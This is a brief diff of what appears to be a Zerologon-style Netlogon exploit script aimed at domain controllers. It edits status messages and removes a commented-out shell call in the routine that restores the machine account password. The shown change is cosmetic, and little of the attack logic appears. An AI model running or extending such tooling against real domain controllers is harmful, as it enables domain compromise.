@@ -144,7 +144,7 @@ class ChangeMachinePassword:
         indata = b'\x00' * (512-len(self.__password)) + self.__password + pack('<L', len(self.__password))
         request['ClearNewPassword'] = nrpc.ComputeNetlogonCredentialAES(indata, self.sessionKey)
         result = dce.request(request)
-        print(LIGHTGREEN+"\n[+] "+NOCOLOR, end = '')
+        print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
         print(WHITE+'Changed password back to original value OK'+NOCOLOR)
 
     def update_authenticator(self, plus=10):
@@ -279,9 +279,7 @@ def perform_attack(dc_handle, dc_ip, target_computer):
                         print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                         print(WHITE+"Attempting to repare "+hostname+NOCOLOR)
                         print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
-                        print(WHITE+"Running commands... "+NOCOLOR)
-                        #print(YELLOW+restore_command+NOCOLOR)
-                        #subprocess.run(restore_command, shell=True)
+                        print(WHITE+"Running restore commands... "+NOCOLOR)
                         action = ChangeMachinePassword(username, password, domain, int(options.port))
                         action.dump(hostname, options.dc_ip)
                         break
